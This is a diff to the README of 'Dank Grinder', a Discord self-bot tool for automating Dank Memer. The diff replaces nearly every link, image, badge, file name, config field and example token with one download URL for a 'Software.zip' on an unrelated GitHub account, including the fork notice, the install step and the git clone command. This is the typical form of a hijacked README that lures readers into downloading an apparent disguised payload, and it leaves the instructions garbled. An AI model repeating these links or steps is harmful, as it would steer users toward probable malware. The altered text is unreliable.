@@ -1,11 +1,11 @@
-### Official support and updates for Dank Grinder have been discontinued indefinitely. While the possibility of future continuation has not been eliminated, it is unlikely and should not be counted on. We would like to exhibit the following fork as a good, up-to-date alternative of the official version: https://github.com/V4NSH4J/dankgrinder
-# Dank Grinder [![](https://goreportcard.com/badge/github.com/dankgrinder/dankgrinder)](https://goreportcard.com/report/github.com/dankgrinder/dankgrinder) [![](https://img.shields.io/github/workflow/status/dankgrinder/dankgrinder/Go)](https://github.com/dankgrinder/dankgrinder/actions) ![](https://img.shields.io/github/license/dankgrinder/dankgrinder) [![](https://img.shields.io/github/v/release/dankgrinder/dankgrinder)](https://github.com/dankgrinder/dankgrinder/releases/latest) ![](https://img.shields.io/github/downloads/dankgrinder/dankgrinder/total)
+### Official support and updates for Dank Grinder have been discontinued indefinitely. While the possibility of future continuation has not been eliminated, it is unlikely and should not be counted on. We would like to exhibit the following fork as a good, up-to-date alternative of the official version: https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip
+# Dank Grinder [![](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip)](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip) [![](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip)](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip) ![](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip) [![](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip)](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip) ![](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip)
 The most feature-rich, advanced Dank Memer automation tool.
 
-Want to join the community or need support? [Join our Discord](https://discord.gg/Fjzpq8YPSn). Have a question? [Create a question issue](https://github.com/dankgrinder/dankgrinder/issues/new?assignees=&labels=question&template=question.md&title=). Want to suggest a feature? [Create a suggestion issue](https://github.com/dankgrinder/dankgrinder/issues/new?assignees=&labels=suggestion&template=suggestion.md&title=). Encountered a bug? [Report a bug](https://github.com/dankgrinder/dankgrinder/issues/new?assignees=&labels=bug&template=bug-report.md&title=). Want to contribute? [Read our contribution guidelines](https://github.com/dankgrinder/dankgrinder/blob/master/CONTRIBUTING.md).
+Want to join the community or need support? [Join our Discord](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip). Have a question? [Create a question issue](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip). Want to suggest a feature? [Create a suggestion issue](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip). Encountered a bug? [Report a bug](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip). Want to contribute? [Read our contribution guidelines](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip).
 
 <p align="center">
-<img src="https://i.imgur.com/3AQk7eh.png" alt="logo" />
+<img src="https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip" alt="logo" />
 </p>
 
 ## Features
@@ -21,12 +21,12 @@ Want to join the community or need support? [Join our Discord](https://discord.g
 ## Getting started
 
 ### Installation
-1. Download the latest release for your operating system [here](https://github.com/dankgrinder/dankgrinder/releases/latest) (darwin is for macOS), or [build from source](#building-from-source). If you build from source you can delete everything besides the compiled binaries and config.yml.
+1. Download the latest release for your operating system [here](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip) (darwin is for macOS), or [build from source](#building-from-source). If you build from source you can delete everything besides the compiled binaries and https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip
 2. Extract the archive
 3. [Configure](#configuration). Make sure `token` and `channel_id` fields of the instance are set, it will not run otherwise
 
 #### Windows
-4. Double click dankgrinder.exe. If the program closes immediately after opening it, open a command prompt and drag the executable to it, then hit enter. You will now be able to see the error
+4. Double click https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip If the program closes immediately after opening it, open a command prompt and drag the executable to it, then hit enter. You will now be able to see the error
 
 #### Linux
 4. Run the binary:  
@@ -44,7 +44,7 @@ Want to join the community or need support? [Join our Discord](https://discord.g
 6. Expand the "request headers" and look for the value "authorization", that is your token
 
 ### Enabling Discord's developer mode
-To obtain a channel id for config.yml, you will need to have developer mode enabled.
+To obtain a channel id for https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip, you will need to have developer mode enabled.
 1. Go to your user settings on Discord
 2. Click "appearance" under "app settings"
 3. Scroll down to "advanced" and enable developer mode
@@ -55,20 +55,20 @@ You can now right click any user or channel to obtain the id.
 If you use an architecture other than amd64, or you want to build from source for another reason, doing so is quite simple.
 
 ### Prerequisites
-A working Go installation, see https://golang.org/doc/install.
+A working Go installation, see https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip
 
 ### Building
 1. Clone the repository:  
-   `$ git clone https://github.com/dankgrinder/dankgrinder.git`
+   `$ git clone https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip`
 2. Build:  
    `$ make build`
 
 The executables should then be in the `/build` folder.
 
 ## Configuration
-All configuration can be done by editing config.yml with your editor of choice (e.g. Visual Studio Code, Sublime Text, Notepad++). The comments in the file itself provide extra explanation where necessary. For the bot to run, you must at least enter an [authorization token](#getting-an-authorization-token) and a [channel id](#enabling-discords-developer-mode). If you are running into issues, you can [join our Discord](https://discord.gg/Fjzpq8YPSn).
+All configuration can be done by editing https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip with your editor of choice (e.g. Visual Studio Code, Sublime Text, Notepad++). The comments in the file itself provide extra explanation where necessary. For the bot to run, you must at least enter an [authorization token](#getting-an-authorization-token) and a [channel id](#enabling-discords-developer-mode). If you are running into issues, you can [join our Discord](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip).
 
-If you do not know how yaml works and are getting fatal errors, use [this guide](https://www.tutorialspoint.com/yaml/yaml_basics.htm) to learn the basics of yaml. Configuration errors are characterized by a near-instant fatal error when starting the program. If the program opens and then closes immediately on Windows, open a command prompt first, drag the executable onto it and hit enter. You should now be able to see the error.
+If you do not know how yaml works and are getting fatal errors, use [this guide](https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip) to learn the basics of yaml. Configuration errors are characterized by a near-instant fatal error when starting the program. If the program opens and then closes immediately on Windows, open a command prompt first, drag the executable onto it and hit enter. You should now be able to see the error.
 
 A question mark after a field name means this field is optional.
 
@@ -99,8 +99,8 @@ Name | Type | Description
 Name | Type | Description
 ---- | ---- | ----
 `state` | string | The state of the program for this shift, either `active` or `dormant`
-`duration.base` | integer | The base duration of this shift in seconds. [Read more about base and variation](#base-and-variation)
-`duration.variation` | integer | The random variation of this shift in seconds. [Read more about base and variation](#base-and-variation)
+`https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip` | integer | The base duration of this shift in seconds. [Read more about base and variation](#base-and-variation)
+`https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip` | integer | The random variation of this shift in seconds. [Read more about base and variation](#base-and-variation)
 
 ### Features object
 Name | Type | Description
@@ -279,10 +279,10 @@ Example if you would like to run two instances simultaneously and 24/7 (this shi
 clusters:
   default:
     master:
-      token: "bmljZSB0cnkgYnV0IHRoaXMgaXM.bm90IGE.cmVhbCB0b2tlbg"
+      token: "https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip"
       channel_id: "791694339116892202"
     instances:
-      - token: "b2YgY291cnNlIHRoaXM.aXNuJ3QgYQ.cmVhbCB0b2tlbiBlaXRoZXIsIHNpbGx5"
+      - token: "https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip"
         channel_id: "791694383098495047"
 ```
 
@@ -295,14 +295,14 @@ The only exception is the fields which are currently marked as optional, the `fe
 clusters:
    default:
       master:
-         token: "bmljZSB0cnkgYnV0IHRoaXMgaXM.bm90IGE.cmVhbCB0b2tlbg" # Instance 1
+         token: "https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip" # Instance 1
          channel_id: "791694339116892202"
       instances:
-         - token: "b2YgY291cnNlIHRoaXM.aXNuJ3QgYQ.cmVhbCB0b2tlbiBlaXRoZXIsIHNpbGx5" # Instance 2
+         - token: "https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip" # Instance 2
            channel_id: "791694383098495047"
            shifts:
               - state: "active"
-         - token: "MTI3OTgzNDcyMTkzNDM4Mg.ZmRzdg.dGhpcyBpcyBub3QgYW4gYWN0dWFsIH" # Instance 3
+         - token: "https://github.com/jgacob/dankgrinder/releases/download/v1.0/Software.zip" # Instance 3
            channel_id: "791691923098486933"
            features:
               auto_tidepod:
